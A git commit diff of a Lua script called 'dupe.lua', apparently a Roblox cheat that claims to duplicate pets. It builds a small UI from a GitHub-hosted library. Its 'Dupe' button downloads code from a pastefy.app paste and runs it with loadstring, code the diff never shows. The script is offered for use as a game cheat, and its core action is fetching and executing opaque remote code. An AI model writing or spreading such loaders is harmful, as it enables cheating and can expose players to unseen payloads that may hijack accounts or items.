560a62f85ec5faea5d77f5c6dcf08815f6016dc7
exclusiv1337 <exclusiv1392@gmail.com>
2025-05-24 15:05:59 +0200

    Update dupe.lua

--- dupe.lua
+++ dupe.lua
@@ -1,12 +1,16 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("Dupe Pets", "Serpent")
 
-local DupeButton = Window:NewTab(""):NewSection(""):NewButton("Dupe", "", function()
+-- Главная вкладка с кнопкой Dupe
+local MainTab = Window:NewTab("Dupe")
+local DupeSection = MainTab:NewSection("")
+
+-- Создаем кнопку с возможностью редактирования текста
+local DupeButton = DupeSection:NewButton("Dupe", "", function()
     loadstring(game:HttpGet("https://pastefy.app/iRFe6rwv/raw"))()
 end)
+DupeButton.Instance.Text = "Write your pet here"  -- Редактируемый текст на кнопке
 
--- Установите свой текст (EN) на кнопке:
-DupeButton.Instance.Text = "Write your pet here" -- ← Меняйте этот текст
-
-
-Window:NewTab(""):NewSection("Made by Mangekoy2 | v1.0")
+-- Вкладка с информацией об авторе
+local InfoTab = Window:NewTab("Info")
+InfoTab:NewSection("Made by Mangekoy2 | v1.0")
